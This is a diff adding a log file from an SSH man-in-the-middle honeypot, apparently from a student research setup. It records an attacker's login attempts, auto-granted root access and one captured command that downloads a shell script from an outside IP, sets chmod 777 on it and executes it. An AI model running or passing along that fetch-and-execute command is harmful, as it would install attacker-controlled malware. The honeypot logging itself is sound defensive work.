@@ -1,0 +1,79 @@
+
+{"level":"error","message":"Forever detected script was killed by signal: SIGKILL"}
+(node:2612943) Warning: Accessing non-existent property 'padLevels' of module exports inside circular dependency
+(Use `node --trace-warnings ...` to show where the warning was created)
+Started with the following options:
+{
+  debug: true,
+  mitmIp: '10.0.3.1',
+  autoAccess: true,
+  autoAccessCache: 5000,
+  maxAttemptsPerConnection: 6,
+  sshServerIdentifier: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2',
+  containerMountPathPrefix: '/var/lib/lxc',
+  containerMountPathSuffix: 'rootfs/',
+  loggingAttackerStreams: '/home/student/MITM/logs/session_streams',
+  loggingAuthenticationAttempts: '/home/student/MITM/logs/authentication_attempts',
+  loggingLogins: '/home/student/MITM/logs/logins',
+  loggingKeystrokes: '/home/student/MITM/logs/keystrokes',
+  containerName: 'DATABASE_3',
+  containerIp: '10.0.3.234',
+  mitmPort: 1002,
+  autoAccessFixed: 1
+}
+2022-10-22 22:18:14.599 - [Info] MITM Version: 2
+2022-10-22 22:18:14.600 - [Info] Auto Access Enabled: true
+2022-10-22 22:18:14.600 - [Debug] [Init] Auto Access Theshold Achieved: false
+2022-10-22 22:18:14.606 - [Info] SSH man-in-the-middle server for 10.0.3.234 listening on 10.0.3.1:1002
+2022-10-22 22:37:41.310 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.312 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.313 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.313 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.314 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.314 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.315 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.315 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:41.316 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:42.518 - [Debug] [Connection] Attacker connected: 35.185.79.120 | Client Identification: SSH-2.0-Go
+2022-10-22 22:37:49.061 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'none'
+2022-10-22 22:37:49.062 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 22:37:49.094 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'none'
+2022-10-22 22:37:49.094 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 22:37:49.102 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'none'
+2022-10-22 22:37:49.102 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 22:37:49.105 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'none'
+2022-10-22 22:37:49.105 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 22:37:49.141 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'none'
+2022-10-22 22:37:49.141 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 22:37:50.596 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'none'
+2022-10-22 22:37:50.597 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 22:37:59.008 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'password'
+2022-10-22 22:37:59.009 - [Debug] [Auto Access] Attacker: 35.185.79.120, Threshold: 1, Attempts: 1
+2022-10-22 22:37:59.009 - [Debug] [Auto Access] Compromising the honeypot
+2022-10-22 22:37:59.009 - [Debug] [Auto Access] Adding the following credentials: 'root:nagiosxi'
+2022-10-22 22:37:59.067 - [Debug] [Auto Access] Auto-access is now disabled for the remainder of this MITM server instance
+2022-10-22 22:37:59.069 - [Debug] [Auth] Valid credentials - Password Authentication
+2022-10-22 22:37:59.069 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.234
+2022-10-22 22:37:59.073 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'password'
+2022-10-22 22:37:59.074 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-22 22:37:59.074 - [Debug] [Auth] Attacker: 35.185.79.120 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 22:37:59.075 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'password'
+2022-10-22 22:37:59.075 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-22 22:37:59.076 - [Debug] [Auth] Attacker: 35.185.79.120 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 22:37:59.120 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2022-10-22 22:37:59.161 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'password'
+2022-10-22 22:37:59.161 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-22 22:37:59.162 - [Debug] [Auth] Attacker: 35.185.79.120 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 22:37:59.234 - [Debug] [Connection] Attacker closed the connection
+2022-10-22 22:37:59.241 - [Debug] [Connection] Attacker closed the connection
+2022-10-22 22:37:59.283 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'password'
+2022-10-22 22:37:59.283 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-22 22:37:59.284 - [Debug] [Auth] Attacker: 35.185.79.120 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-22 22:37:59.350 - [Debug] [Connection] Attacker closed the connection
+2022-10-22 22:37:59.419 - [Debug] [Connection] Attacker closed the connection
+2022-10-22 22:37:59.481 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp; rm -rf wget*; wget http://179.43.175.5/wget.sh; curl -O http://179.43.175.5/wget.sh; chmod 777 wget.sh; ./wget.sh server; sh wget.sh server
+2022-10-22 22:37:59.638 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'none'
+2022-10-22 22:37:59.638 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2022-10-22 22:37:59.672 - [Debug] [Auth] Attacker 35.185.79.120 trying to authenticate with 'password'
+2022-10-22 22:37:59.673 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-22 22:37:59.673 - [Debug] [Auth] Attacker: 35.185.79.120 has so far made 1 attempts. Remaining: 5 attempts
